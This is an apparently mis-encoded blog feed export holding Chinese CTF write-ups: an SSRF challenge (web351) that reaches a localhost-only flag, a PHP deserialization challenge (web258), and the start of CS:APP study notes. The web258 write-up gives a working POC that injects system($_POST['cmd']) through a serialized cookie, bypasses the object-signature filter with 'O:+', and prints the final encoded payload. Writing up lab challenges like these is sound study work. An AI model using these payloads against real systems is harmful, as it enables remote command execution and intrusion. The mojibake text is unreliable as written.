class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;éæœ¬åœ°è®¿é—®&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ˜¯æ— æ³•è®¿é—®çš„ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/1.png" alt="1"></p><p>åªæœ‰æˆ‘ä»¬åœ¨æœ¬æœºä½¿ç”¨ç¯å›åœ°å€æ‰èƒ½è®¿é—®æˆåŠŸã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/2.png" alt="2"></p><p>é‚£ä¹ˆæˆ‘ä»¬æœ€ä¸»è¦å°±æ˜¯å¦‚ä½•è®©æœåŠ¡å™¨ä»£æˆ‘ä»¬å‘èµ·è¯·æ±‚ï¼Œå¦‚æœèƒ½ä»£æˆ‘ä»¬å‘èµ·è¯·æ±‚ï¼Œé‚£å°±ä¼šé€ æˆç»™ <code>ssrf</code>ã€‚</p><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€æ­¥ä¸€æ­¥è§£è¯»ã€‚</p><p>ç¬¬ä¸€ä¸ªä» <code>url</code> å‚æ•°ä¸­è·å– <code>url</code>ã€‚</p><ul><li><code>curl_init</code>ï¼šåˆå§‹åŒ–ä¸€ä¸ª <code>cURL</code> ä¼šè¯ï¼Œå‚æ•°å¯ä»¥ä¸ºç©ºï¼Œæˆ–è€…ä¸ºä¸€ä¸ª <code>url</code></li><li><code>curl_setopt</code>ï¼šè®¾ç½® <code>cURL</code> ä¼šè¯çš„ä¸€äº›å±æ€§ã€‚</li><li><code>curl_exec</code>ï¼šæ ¹æ®å‚æ•°é€‰é¡¹æ‰§è¡Œ <code>curl</code> å‘½ä»¤ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚</li><li><code>curl_close</code>ï¼šå…³é—­ä¼šè¯</li></ul><p>å°±æ˜¯ç›´æ¥å¯ä»¥è¯·æ±‚ä¸€ä¸ªç½‘é¡µï¼Œç„¶åå¯ä»¥å‘ç°åº•ä¸‹æœ‰ <code>flag.php</code>ï¼Œä½†æ˜¯åªæœ‰æœ¬åœ°èƒ½è®¿é—®ï¼Œå› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬è®© <code>curl</code> å»è¯·æ±‚ <code>127.0.0.1/flag.php</code> å³å¯ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/3.png" alt="3"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»Šå¤©å­¦å­¦ &lt;code&gt;ssrf&lt;/code&gt;ï¼Œæœ‰äº›æœåŠ¡å™¨çš„æŸäº›èµ„æºå¯èƒ½ä¼šè§„å®šè¯·æ±‚å¿…é¡»æ¥è‡ªå†…ç½‘æ‰èƒ½è®¿é—®èµ„æºï¼Œå¦‚æœä¸æ˜¯å†…ç½‘ç”¨æˆ·åˆ™ä¼šè¢«æ‹’ï¼Œè€Œ &lt;code&gt;ssrf&lt;/code&gt; å°±èƒ½ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªå†…ç½‘è®¿é—®çš„é€šé“ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="ssrf" scheme="http://example.com/categories/ctf/web/ssrf/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshowåˆ·é¢˜è®°å½•-web258</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/</id>
    <published>2022-06-15T16:00:00.000Z</published>
    <updated>2022-06-15T17:54:32.503Z</updated>
    
    <content type="html"><![CDATA[<p>ctfshowçš„åˆ·é¢˜è®°å½•-web258</p><span id="more"></span><p>ååºåˆ—åŒ–å¯»æ€ç€å¤šåšç‚¹å§ï¼Œååºåˆ—åŒ–ä¸»è¦å°±æ˜¯å†™pocï¼Œå»æ„é€ ç¬¦åˆè¦æ±‚çš„å¯¹è±¡ã€‚</p><h2 id="åˆ†ææºç "><a href="#åˆ†ææºç " class="headerlink" title="åˆ†ææºç "></a>åˆ†ææºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æºç å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª <code>backDoor</code> ç±»ï¼Œå®ƒèƒ½è®©æˆ‘ä»¬ä½¿ç”¨ <code>eval</code> è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚é‡‡ç”¨cookieä¼ å…¥pocååºåˆ—åŒ–ï¼Œæˆ‘ä»¬è®© <code>ctfShowUser</code> è¿™ä¸ª <code>class</code> å±æ€§ä¸º <code>backDoor</code> çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸” <code>code</code> éœ€è¦æˆ‘ä»¬ä»»æ„å¯æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ <code>getinfo</code> å³å¯è§¦å‘ï¼Œåœ¨ <code>ctfShowUser</code> ç±»ä¸­çš„ææ„å‡½æ•°ä¼šè°ƒç”¨æ‰§è¡Œï¼Œäºæ˜¯æˆ‘ä»¬å†™å‡ºå¦‚ä¸‹ <code>poc</code>ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™å‡ºpocä¹‹åè¿˜è¦æ³¨æ„ï¼Œè¿™é‡Œçš„ <code>poc</code> ä¸èƒ½æœ‰ç±»ä¼¼ <code>O:æ•°å­—</code> æˆ–è€…æ˜¯ <code>C:æ•°å­—</code> çš„å½¢å¼ï¼Œå¹¶ä¸”æ— è§†å¤§å°å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œé€šè¿‡åœ¨å†’å·åé¢åŠ ä¸Šä¸€ä¸ª <code>+</code> å³å¯ç»•è¿‡ï¼Œæˆ‘ä»¬åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¯ä»¥åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢ï¼Œå°† <code>O:</code> æ›¿æ¢ä¸º <code>O:+</code>ï¼Œ <code>C:</code> æ›¿æ¢æˆ <code>C:+</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆ <code>poc</code> ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A22%3A%22system%28%24_POST%5B%22cmd%22%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨ <code>cookie</code> çš„ <code>user</code> å­—æ®µä¸­ä¼ å…¥ <code>poc</code>ï¼Œç„¶å <code>post</code> ç»™ä¸€ä¸ª <code>cmd</code> å‚æ•°ä½œä¸ºå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/1.png" alt="1"></p><p>å‘ç° <code>flag.php</code>ï¼Œæˆ‘ä»¬ <code>cat /flag</code> å¹¶ä¸”æ‰“å¼€æºä»£ç å‘ç° <code>flag</code>ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/2.png" alt="2"></p><p>è¿™é‡Œä¸»è¦è¿˜å¾—æ³¨æ„ <code>url</code> ç¼–ç ä¼ å…¥ï¼Œå› ä¸º <code>cookie</code> ä»¥ <code>;</code> ä½œä¸ºåˆ†å‰²ç¬¦å·ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ctfshowçš„åˆ·é¢˜è®°å½•-web258&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="unserialize" scheme="http://example.com/categories/ctf/web/unserialize/"/>
    
    
  </entry>
  
  <entry>
    <title>CS:APPç¬¬äºŒç« å¤ä¹ </title>
    <link href="http://example.com/2022/06/03/CSAPP_Datalab/"/>
    <id>http://example.com/2022/06/03/CSAPP_Datalab/</id>
    <published>2022-06-03T11:00:00.000Z</published>
    <updated>2022-06-03T07:58:13.507Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰ <code>CS:APP</code> æ²¡æœ‰å¥½å¥½å­¦ï¼Œä»Šå¤©ä¸‹å®šå†³å¿ƒæ¥é‡æ–°çœ‹ä¸€éï¼Œå¹¶æŠŠå®éªŒå¥½å¥½åšä¸€éä»¥å·©å›ºè‡ªèº«ã€‚</p><span id="more"></span><h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><h3 id="æ•°å­—è¡¨ç¤º"><a href="#æ•°å­—è¡¨ç¤º" class="headerlink" title="æ•°å­—è¡¨ç¤º"></a>æ•°å­—è¡¨ç¤º</h3><p>äºŒè¿›åˆ¶ï¼šåŒºåˆ«äºæˆ‘ä»¬å¹³æ—¶è®¡æ•°ä½¿ç”¨çš„åè¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ä½¿ç”¨çš„æ˜¯é€¢äºŒè¿›ä¸€åŸåˆ™ï¼Œè€Œæˆ‘ä»¬çš„åè¿›åˆ¶åˆ™æ˜¯é€¢åè¿›ä¸€ï¼Œæ¯”å¦‚æˆ‘ä»¬åè¿›åˆ¶çš„ <code>9+1</code> ä¸­çš„ <code>9</code>ï¼Œç­”æ¡ˆåº”è¯¥æ˜¯åï¼Œä½†æ˜¯ååº”è¯¥è¿›ä¸€ï¼Œå› æ­¤å¾—å‡ºäº†æˆ‘ä»¬å¸¸è§„çš„ç­”æ¡ˆ <code>10</code>ã€‚åœ¨äºŒè¿›åˆ¶é‡Œé¢ï¼Œæ¯ä¸€ä½åªè¦å¤§äºç­‰äº <code>2</code> åˆ™éƒ½è¦å‘é«˜ä½è¿›ä¸€ã€‚ä¸ºäº†æ–¹ä¾¿è¡¨ç¤ºï¼Œè¿˜è¡ç”Ÿå‡ºäº†äºŒè¿›åˆ¶çš„å­ç±»ï¼Œæ¯”å¦‚å…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ç­‰ï¼Œä¸»è¦æ˜¯äºŒè¿›åˆ¶å‘è¿™R</p><p>äº›è¿›åˆ¶è½¬æ¢è¾ƒä¸ºå®¹æ˜“ï¼Œè€Œè®¡ç®—æœºå¹³æ—¶åˆéƒ½å¤„ç†äºŒè¿›åˆ¶æ•°æ®ï¼Œå› æ­¤å°±å‡ºç°äº†è¿™äº›å¸¸è§çš„è¿›åˆ¶è®¡æ•°ã€‚</p><h3 id="ä¿¡æ¯å­˜å‚¨-1"><a href="#ä¿¡æ¯å­˜å‚¨-1" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h3><p>å¤§å¤šæ•°è®¡ç®—æœºä½¿ç”¨çš„éƒ½æ˜¯8ä½ï¼ˆåœ¨è®¡ç®—æœºä¸­ï¼Œé™¤ç‰¹æ®Šè¯´æ˜å¤–ï¼Œä¸€ä½å‡æŒ‡çš„æ˜¯äºŒè¿›åˆ¶çš„ä½ï¼‰çš„å—ï¼Œæˆ–è€…å«å­—èŠ‚ï¼Œå­—èŠ‚æ˜¯ä½œä¸ºè®¡ç®—æœºå¯å¯»å€çš„æœ€å°å•ä½ã€‚ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¹¶ä¸ä¹ æƒ¯äºå°†ä¸€ä¸ªå­—èŠ‚å†™æˆå…«ä½äºŒè¿›åˆ¶çš„æ•°ï¼Œè€Œæ˜¯ä¼šå†™æˆä¸¤ä½åå…­è¿›åˆ¶çš„æ•°ã€‚åå…­è¿›åˆ¶ä¸äºŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ä¹Ÿä¼šååˆ†å®¹æ˜“ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x99-&gt;0b10011001</span><br><span class="line">0x88-&gt;0b10001000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å¹¶ä¸ç”¨åƒåè¿›åˆ¶é‚£æ ·æƒå€¼ç›¸åŠ æˆ–è€…æ˜¯é™¤äºŒå–ä½™é‚£ä¹ˆéº»çƒ¦ï¼Œæˆ‘ä»¬æŠŠä¸€ä½åå…­è¿›åˆ¶è§†ä¸ºå››ä½äºŒè¿›åˆ¶å³å¯ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è½¬æ¢çš„æ—¶å€™å°±æ˜¯ç›´æ¥æ¯ä¸€ä½åˆ†åˆ«è½¬äº†ï¼Œå¯ä»¥çœ‹å‡ºååˆ†çš„æ–¹ä¾¿ã€‚</p><h4 id="å­—æ•°æ®å¤§å°"><a href="#å­—æ•°æ®å¤§å°" class="headerlink" title="å­—æ•°æ®å¤§å°"></a>å­—æ•°æ®å¤§å°</h4><p>æ¯å°è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªå­—é•¿ï¼Œå­—é•¿ä¸ºè®¡ç®—æœº <code>CPU</code> ä¸€æ¬¡èƒ½å¤„ç†çš„æœ€å¤§æ•°æ®ï¼Œä¹Ÿæœ‰ä¸€ç§è¯´æ³•æ˜¯èƒ½è¡¨ç¤ºçš„æœ€å¤§å†…å­˜ã€‚å…¶å®æ„æ€æ˜¯å·®ä¸å¤šçš„ï¼Œæ¯”å¦‚æˆ‘ä»¬éƒ½çŸ¥é“ <code>32</code> ä½çš„è®¡ç®—æœºæœ€å¤šèƒ½è£… <code>4GB</code> çš„å†…å­˜ï¼Œå†å¤šå®ƒä¹Ÿæ˜¯åªèƒ½ä½¿ç”¨è¿™ä¹ˆå¤šçš„å†…å­˜ï¼Œé‚£æ˜¯å› ä¸º <code>CPU</code> è¦è®¿é—®å†…å­˜çš„æ—¶å€™ï¼Œä¹Ÿåªèƒ½ä½¿ç”¨ä¸€ä¸ª <code>32</code> ä½çš„æ•°æ®æ¥è¡¨ç¤ºåœ°å€ï¼Œ32ä½çš„æ•°èƒ½è¡¨ç¤ºçš„æ•°çš„ä¸ªæ•°ä¹Ÿå°±æ˜¯ <code>2^32</code> è¿™ä¹ˆå¤šï¼Œè€Œåœ°å€æŒ‡ç¤ºçš„å•ä½æ˜¯å­—èŠ‚ï¼Œæ‰€ä»¥æœ€å¤šå°±æ˜¯ <code>2^32</code> 